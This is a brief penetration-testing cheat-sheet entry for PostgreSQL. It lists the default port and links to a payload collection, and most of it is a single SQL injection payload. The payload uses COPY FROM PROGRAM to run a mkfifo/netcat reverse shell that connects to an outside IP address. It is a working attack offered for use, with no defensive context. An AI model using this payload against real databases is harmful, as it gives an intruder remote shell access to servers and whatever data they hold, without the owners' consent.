# PostgreSQL

- **Default port:** 5432

Reference: [PayloadsAllTheThings PostgreSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)

**Reverse shell via COPY FROM PROGRAM:**
```sql
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL;COPY TEMP FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.58 1234 >/tmp/f';--
```
